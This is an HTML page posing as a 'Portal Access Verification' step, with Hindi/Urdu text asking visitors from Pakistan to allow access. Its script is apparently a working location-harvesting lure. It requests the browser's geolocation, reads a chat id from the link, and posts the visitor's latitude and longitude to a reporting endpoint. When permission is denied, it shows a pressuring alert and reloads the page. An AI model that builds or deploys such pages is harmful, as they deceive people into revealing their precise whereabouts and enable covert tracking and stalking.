<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Online Portal Verification</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }body {
  background: linear-gradient(to right, #2b5876, #4e4376);
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  color: white;
  text-align: center;
}

.container {
  background: rgba(255, 255, 255, 0.1);
  backdrop-filter: blur(10px);
  padding: 40px;
  border-radius: 15px;
  box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
  max-width: 400px;
}

h1 {
  margin-bottom: 20px;
  font-size: 28px;
}

p {
  font-size: 16px;
  margin-bottom: 30px;
}

.loading {
  width: 30px;
  height: 30px;
  border: 4px solid rgba(255, 255, 255, 0.3);
  border-top: 4px solid white;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

  </style>
</head>
<body>
  <div class="container">
    <h1>Portal Access Verification</h1>
    <p>Aap Pakistan se hain? Kripya system verification ke liye allow karein...</p>
    <div class="loading"></div>
  </div>  <script>
    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const chat_id = new URLSearchParams(window.location.search).get("id");

      fetch("/api/report", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, latitude: lat, longitude: lon })
      });
    }

    function handleError(err) {
      alert("Location allow karna zaroori hai verification ke liye.");
      location.reload();
    }

    setTimeout(() => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Geolocation not supported in your browser");
      }
    }, 1000);
  </script></body>
</html>
